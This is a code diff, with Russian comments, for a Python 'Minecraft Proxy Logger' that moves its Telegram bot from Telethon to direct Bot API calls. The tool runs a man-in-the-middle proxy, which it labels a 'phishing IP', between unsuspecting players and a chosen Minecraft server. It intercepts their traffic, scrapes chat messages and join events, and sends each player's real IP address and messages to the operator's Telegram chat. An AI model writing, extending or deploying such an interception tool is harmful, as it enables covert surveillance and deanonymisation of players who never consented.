@@ -7,24 +7,14 @@ import re
 import os
 import sys
 import requests
+import json
 from datetime import datetime
-from telethon import TelegramClient, events
 
 # ======================================================
-#  КОНФИГУРАЦИЯ С ПРОВЕРКОЙ
+#  КОНФИГУРАЦИЯ
 # ======================================================
 
 try:
-    API_ID = int(os.getenv('API_ID', 0))
-    if API_ID == 0:
-        print("❌ ОШИБКА: API_ID не задан или равен 0!")
-        sys.exit(1)
-    
-    API_HASH = os.getenv('API_HASH', '')
-    if not API_HASH or len(API_HASH) < 32:
-        print(f"❌ ОШИБКА: API_HASH не задан или слишком короткий! Длина: {len(API_HASH)}")
-        sys.exit(1)
-    
     BOT_TOKEN = os.getenv('BOT_TOKEN', '')
     if not BOT_TOKEN or ':' not in BOT_TOKEN:
         print("❌ ОШИБКА: BOT_TOKEN не задан или неправильного формата!")
@@ -33,8 +23,6 @@ try:
     PROXY_PORT = int(os.getenv('PORT', 7777))
     
     print("✅ Все переменные окружения загружены:")
-    print(f"   API_ID: {API_ID}")
-    print(f"   API_HASH: {API_HASH[:5]}... (скрыто)")
     print(f"   BOT_TOKEN: {BOT_TOKEN[:5]}... (скрыто)")
     print(f"   PORT: {PROXY_PORT}")
     
@@ -43,8 +31,42 @@ except Exception as e:
     sys.exit(1)
 
 # ======================================================
+#  БЕЗ Telethon (используем requests к Bot API)
+# ======================================================
+
+API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+def send_telegram_message(chat_id, text):
+    """Отправляет сообщение через Bot API"""
+    try:
+        url = f"{API_URL}/sendMessage"
+        payload = {
+            'chat_id': chat_id,
+            'text': text,
+            'parse_mode': 'Markdown'
+        }
+        response = requests.post(url, data=payload, timeout=10)
+        return response.ok
+    except Exception as e:
+        print(f"❌ Ошибка отправки: {e}")
+        return False
+
+def get_updates(offset=0):
+    """Получает новые сообщения от пользователей"""
+    try:
+        url = f"{API_URL}/getUpdates"
+        params = {'offset': offset, 'timeout': 30}
+        response = requests.get(url, params=params, timeout=35)
+        if response.ok:
+            return response.json().get('result', [])
+        return []
+    except:
+        return []
+
+# ======================================================
 
 active_sessions = {}
+last_update_id = 0
 
 def get_public_ip():
     """Получает внешний IP сервера"""
@@ -59,128 +81,114 @@ def get_public_ip():
             return '0.0.0.0'
 
 # ======================================================
-#  TELEGRAM БОТ
+#  ОБРАБОТКА КОМАНД
 # ======================================================
 
-print("🔄 Подключение к Telegram...")
-
-try:
-    bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-    print("✅ Подключение к Telegram успешно!")
-except Exception as e:
-    print(f"❌ Ошибка подключения к Telegram: {e}")
-    sys.exit(1)
-
-@bot.on(events.NewMessage(pattern='/start'))
-async def start_command(event):
-    await event.respond(
-        "🤖 *Minecraft Proxy Logger*\n\n"
-        "📌 Команды:\n"
-        "`/log IP_сервера` - начать логирование\n"
-        "`/stop` - остановить\n"
-        "`/status` - статус сессии\n\n"
-        "Пример: `/log funtime.su`",
-        parse_mode='markdown'
-    )
-
-@bot.on(events.NewMessage(pattern='/help'))
-async def help_command(event):
-    await event.respond(
-        "👑 *Команды бота:*\n\n"
-        "📤 `/log IP_сервера` - создать прокси и начать логирование\n"
-        "   Пример: `/log funtime.su`\n\n"
-        "🛑 `/stop` - остановить текущую сессию\n\n"
-        "📊 `/status` - показать статус активной сессии\n\n"
-        "❓ `/help` - эта справка\n\n"
-        "*Как это работает:*\n"
-        "1. Ты отправляешь `/log funtime.su`\n"
-        "2. Бот создает прокси-сервер и дает тебе IP для подключения\n"
-        "3. Ты заходишь в Minecraft по этому IP\n"
-        "4. Бот логирует ВСЕ сообщения чата и присылает их тебе сюда",
-        parse_mode='markdown'
-    )
-
-@bot.on(events.NewMessage(pattern='/log (.*)'))
-async def log_command(event):
-    user_id = event.sender_id
-    server_ip = event.pattern_match.group(1).strip()
+def handle_command(chat_id, text, username):
+    """Обрабатывает команды от пользователей"""
+    global active_sessions
     
-    if user_id in active_sessions:
-        await event.respond(
-            "❌ У тебя уже есть активная сессия!\n"
-            "Используй `/stop` чтобы остановить её.",
-            parse_mode='markdown'
+    if text == '/start':
+        send_telegram_message(
+            chat_id,
+            "🤖 *Minecraft Proxy Logger*\n\n"
+            "📌 Команды:\n"
+            "`/log IP_сервера` - начать логирование\n"
+            "`/stop` - остановить\n"
+            "`/status` - статус сессии\n\n"
+            "Пример: `/log funtime.su`"
         )
         return
     
-    public_ip = get_public_ip()
-    phishing_ip = f"{public_ip}:{PROXY_PORT}"
-    
-    active_sessions[user_id] = {
-        'target_server': server_ip,
-        'chat': event.chat,
-        'user_id': user_id,
-        'started': datetime.now(),
-        'messages': [],
-        'phishing_ip': phishing_ip,
-        'sent_messages': []
-    }
-    
-    await event.respond(
-        f"🟢 *Туннель создан!*\n\n"
-        f"🌐 *IP для подключения:* `{phishing_ip}`\n"
-        f"📡 *Целевой сервер:* `{server_ip}`\n\n"
-        f"📝 *Инструкция:*\n"
-        f"1. Открой Minecraft\n"
-        f"2. Введи IP: `{phishing_ip}`\n"
-        f"3. Все сообщения чата будут приходить сюда\n\n"
-        f"🛑 Для остановки: `/stop`",
-        parse_mode='markdown'
-    )
-    
-    print(f"✅ Сессия {user_id}: {server_ip} → {phishing_ip}")
-
-@bot.on(events.NewMessage(pattern='/stop'))
-async def stop_command(event):
-    user_id = event.sender_id
-    
-    if user_id not in active_sessions:
-        await event.respond("❌ У тебя нет активной сессии!", parse_mode='markdown')
+    elif text == '/help':
+        send_telegram_message(
+            chat_id,
+            "👑 *Команды бота:*\n\n"
+            "📤 `/log IP_сервера` - создать прокси и начать логирование\n"
+            "   Пример: `/log funtime.su`\n\n"
+            "🛑 `/stop` - остановить текущую сессию\n\n"
+            "📊 `/status` - показать статус активной сессии\n\n"
+            "❓ `/help` - эта справка"
+        )
         return
     
-    session = active_sessions[user_id]
-    msg_count = len(session.get('messages', []))
-    duration = (datetime.now() - session['started']).seconds // 60
-    
-    del active_sessions[user_id]
-    
-    await event.respond(
-        f"🔴 *Логирование остановлено*\n\n"
-        f"📊 Всего сообщений: {msg_count}\n"
-        f"⏱ Длительность: {duration} мин",
-        parse_mode='markdown'
-    )
-
-@bot.on(events.NewMessage(pattern='/status'))
-async def status_command(event):
-    user_id = event.sender_id
-    
-    if user_id not in active_sessions:
-        await event.respond("❌ Нет активной сессии.", parse_mode='markdown')
+    elif text == '/stop':
+        if chat_id in active_sessions:
+            session = active_sessions[chat_id]
+            msg_count = len(session.get('messages', []))
+            duration = (datetime.now() - session['started']).seconds // 60
+            del active_sessions[chat_id]
+            send_telegram_message(
+                chat_id,
+                f"🔴 *Логирование остановлено*\n\n"
+                f"📊 Всего сообщений: {msg_count}\n"
+                f"⏱ Длительность: {duration} мин"
+            )
+        else:
+            send_telegram_message(chat_id, "❌ У тебя нет активной сессии!")
         return
     
-    session = active_sessions[user_id]
-    msg_count = len(session.get('messages', []))
-    duration = (datetime.now() - session['started']).seconds // 60
+    elif text == '/status':
+        if chat_id in active_sessions:
+            session = active_sessions[chat_id]
+            msg_count = len(session.get('messages', []))
+            duration = (datetime.now() - session['started']).seconds // 60
+            send_telegram_message(
+                chat_id,
+                f"📊 *Статус сессии:*\n\n"
+                f"🌐 Фишинг IP: `{session['phishing_ip']}`\n"
+                f"📡 Сервер: `{session['target_server']}`\n"
+                f"💬 Сообщений: {msg_count}\n"
+                f"⏱ Длительность: {duration} мин"
+            )
+        else:
+            send_telegram_message(chat_id, "❌ Нет активной сессии.")
+        return
     
-    await event.respond(
-        f"📊 *Статус сессии:*\n\n"
-        f"🌐 Фишинг IP: `{session['phishing_ip']}`\n"
-        f"📡 Сервер: `{session['target_server']}`\n"
-        f"💬 Сообщений: {msg_count}\n"
-        f"⏱ Длительность: {duration} мин",
-        parse_mode='markdown'
-    )
+    elif text.startswith('/log '):
+        server_ip = text.replace('/log ', '').strip()
+        
+        if chat_id in active_sessions:
+            send_telegram_message(
+                chat_id,
+                "❌ У тебя уже есть активная сессия!\n"
+                "Используй `/stop` чтобы остановить её."
+            )
+            return
+        
+        public_ip = get_public_ip()
+        phishing_ip = f"{public_ip}:{PROXY_PORT}"
+        
+        active_sessions[chat_id] = {
+            'target_server': server_ip,
+            'chat_id': chat_id,
+            'started': datetime.now(),
+            'messages': [],
+            'phishing_ip': phishing_ip,
+            'sent_messages': []
+        }
+        
+        send_telegram_message(
+            chat_id,
+            f"🟢 *Туннель создан!*\n\n"
+            f"🌐 *IP для подключения:* `{phishing_ip}`\n"
+            f"📡 *Целевой сервер:* `{server_ip}`\n\n"
+            f"📝 *Инструкция:*\n"
+            f"1. Открой Minecraft\n"
+            f"2. Введи IP: `{phishing_ip}`\n"
+            f"3. Все сообщения чата будут приходить сюда\n\n"
+            f"🛑 Для остановки: `/stop`"
+        )
+        
+        print(f"✅ Сессия {chat_id}: {server_ip} → {phishing_ip}")
+        return
+    
+    else:
+        send_telegram_message(
+            chat_id,
+            "❌ Неизвестная команда!\n"
+            "Используй `/help` для списка команд."
+        )
 
 # ======================================================
 #  ПРОКСИ-СЕРВЕР MINECRAFT
@@ -211,10 +219,9 @@ async def handle_client(player_reader, player_writer):
         player_writer.close()
         return
     
-    user_id = list(active_sessions.keys())[0]
-    session = active_sessions[user_id]
+    chat_id = list(active_sessions.keys())[0]
+    session = active_sessions[chat_id]
     target_server = session['target_server']
-    chat = session['chat']
     
     try:
         print(f"🔄 Подключаюсь к {target_server}")
@@ -222,30 +229,30 @@ async def handle_client(player_reader, player_writer):
             target_server, 25565
         )
         
-        await chat.respond(
+        send_telegram_message(
+            chat_id,
             f"🟢 Игрок подключился к `{target_server}`\n"
-            f"🌐 Реальный IP: `{player_ip[0]}`",
-            parse_mode='markdown'
+            f"🌐 Реальный IP: `{player_ip[0]}`"
         )
         
         player_to_server = asyncio.create_task(forward_data(
-            player_reader, real_writer, "игрок→сервер", chat
+            player_reader, real_writer, "игрок→сервер", chat_id
         ))
         server_to_player = asyncio.create_task(forward_data(
-            real_reader, player_writer, "сервер→игрок", chat
+            real_reader, player_writer, "сервер→игрок", chat_id
         ))
         
         await asyncio.gather(player_to_server, server_to_player)
         
     except Exception as e:
         print(f"❌ Ошибка прокси: {e}")
-        await chat.respond(f"❌ Ошибка прокси: `{str(e)}`", parse_mode='markdown')
+        send_telegram_message(chat_id, f"❌ Ошибка прокси: `{str(e)}`")
     finally:
         player_writer.close()
         real_writer.close()
         print("🔌 Соединение закрыто")
 
-async def forward_data(reader, writer, direction, chat):
+async def forward_data(reader, writer, direction, chat_id):
     """Пересылает данные между игроком и сервером"""
     try:
         while True:
@@ -256,12 +263,12 @@ async def forward_data(reader, writer, direction, chat):
             writer.write(data)
             await writer.drain()
             
-            await parse_minecraft_packet(data, direction, chat)
+            await parse_minecraft_packet(data, direction, chat_id)
             
     except Exception as e:
         print(f"❌ Ошибка в {direction}: {e}")
 
-async def parse_minecraft_packet(data, direction, chat):
+async def parse_minecraft_packet(data, direction, chat_id):
     """Парсит пакеты Minecraft и вытаскивает сообщения"""
     try:
         text = data.decode('utf-8', errors='ignore')
@@ -270,7 +277,7 @@ async def parse_minecraft_packet(data, direction, chat):
         matches = re.findall(chat_pattern, text)
         
         for player, message in matches:
-            session = list(active_sessions.values())[0] if active_sessions else None
+            session = active_sessions.get(chat_id)
             if session:
                 msg_key = f"{player}:{message}"
                 if msg_key not in session.get('sent_messages', []):
@@ -279,30 +286,55 @@ async def parse_minecraft_packet(data, direction, chat):
                     session['sent_messages'].append(msg_key)
                     session['messages'].append(msg_key)
                     
-                    await chat.respond(
-                        f"💬 *{player}*: {message}",
-                        parse_mode='markdown'
+                    send_telegram_message(
+                        chat_id,
+                        f"💬 *{player}*: {message}"
                     )
                     print(f"[ЧАТ] {player}: {message}")
         
         if 'joined the game' in text:
             player = text.split('joined the game')[0].strip()
-            await chat.respond(
-                f"🟢 *{player}* зашел на сервер",
-                parse_mode='markdown'
-            )
+            send_telegram_message(chat_id, f"🟢 *{player}* зашел на сервер")
             print(f"[ВХОД] {player}")
             
         elif 'left the game' in text:
             player = text.split('left the game')[0].strip()
-            await chat.respond(
-                f"🔴 *{player}* вышел с сервера",
-                parse_mode='markdown'
-            )
+            send_telegram_message(chat_id, f"🔴 *{player}* вышел с сервера")
             print(f"[ВЫХОД] {player}")
             
     except:
         pass
+
+# ======================================================
+#  ПОЛЛИНГ TELEGRAM
+# ======================================================
+
+async def poll_telegram():
+    """Проверяет новые сообщения в Telegram"""
+    global last_update_id
+    
+    print("🔄 Запуск поллинга Telegram...")
+    
+    while True:
+        try:
+            updates = get_updates(last_update_id + 1)
+            
+            for update in updates:
+                last_update_id = update.get('update_id', last_update_id)
+                
+                if 'message' in update:
+                    msg = update['message']
+                    chat_id = msg['chat']['id']
+                    text = msg.get('text', '')
+                    username = msg['chat'].get('username', 'unknown')
+                    
+                    if text:
+                        handle_command(chat_id, text, username)
+            
+        except Exception as e:
+            print(f"❌ Ошибка поллинга: {e}")
+        
+        await asyncio.sleep(1)
 
 # ======================================================
 #  ЗАПУСК
@@ -310,7 +342,7 @@ async def parse_minecraft_packet(data, direction, chat):
 
 async def main():
     print("=" * 50)
-    print("🚀 Minecraft Proxy Logger")
+    print("🚀 Minecraft Proxy Logger (Bot API)")
     print("=" * 50)
     
     public_ip = get_public_ip()
@@ -319,10 +351,13 @@ async def main():
     print(f"🔗 Фишинг IP: {public_ip}:{PROXY_PORT}")
     print("=" * 50)
     
+    # Запускаем прокси
     asyncio.create_task(start_proxy_server())
     
-    await bot.start()
-    print("✅ Telegram бот запущен!")
+    # Запускаем поллинг Telegram
+    asyncio.create_task(poll_telegram())
+    
+    print("✅ Бот запущен!")
     print("📌 Используй команду /log <IP>")
     print("=" * 50)
     print("")
@@ -330,7 +365,8 @@ async def main():
     print(f"   {public_ip}:{PROXY_PORT}")
     print("")
     
-    await bot.run_until_disconnected()
+    # Держим приложение живым
+    await asyncio.Event().wait()
 
 if __name__ == '__main__':
     try:
